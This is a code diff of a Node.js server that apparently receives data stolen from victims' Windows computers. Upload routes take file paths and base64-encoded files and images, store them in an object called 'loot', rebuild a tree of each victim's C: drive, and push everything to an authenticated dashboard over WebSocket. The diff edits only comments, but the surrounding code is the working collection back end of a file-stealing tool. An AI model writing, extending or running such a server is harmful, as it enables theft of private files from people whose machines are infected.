@@ -67,7 +67,7 @@ function broadcast(type, data) {
   });
 }
 
-// Adds path to the 'tree' which is basically just a parent child structure. The starting parent is always the C: drive
+// Adds path to the tree which is basically just a parent child structure. The starting parent is always the C: drive
 function addPathToTree(tree, filePath, isFile = false) {
   const parts = filePath.trim().split('\\');
   let current = tree;
@@ -82,8 +82,9 @@ function addPathToTree(tree, filePath, isFile = false) {
   }
 }
 
-// --- Upload routes (before dashboard auth, they use their own token) ---
+// Upload Routes donn below
 
+// Each route pulls the file path from the first line of the body and the content from the rest
 app.post('/upload/wallpaper', requireUploadAuth, (req, res) => {
   const firstNewline = req.body.indexOf('\n');
   const path = req.body.substring(0, firstNewline).trim();
@@ -121,7 +122,7 @@ app.post('/upload/files', requireUploadAuth, (req, res) => {
 app.post('/upload/image', requireUploadAuth, (req, res) => {
   const firstNewline = req.body.indexOf('\n');
   const path = req.body.substring(0, firstNewline).trim();
-  const base64 = req.body.substring(firstNewline + 1); // Gets full path of file, and the base64 string that 'contains' the image
+  const base64 = req.body.substring(firstNewline + 1); // Gets full path of file and the base64 string that has the image
   console.log('Image received:', path); // for debugging
   loot.images[path] = base64;
   addPathToTree(loot.directories, path, true);
@@ -159,6 +160,7 @@ app.get('/api/loot', (req, res) => {
   res.json(loot);
 });
 
+// on connection verify the auth cookie then send  all stored loot to the new client
 wss.on('connection', (ws, req) => {
   const cookies = parseCookies(req.headers.cookie || '');
   if (cookies.auth !== dashboardPassword) {
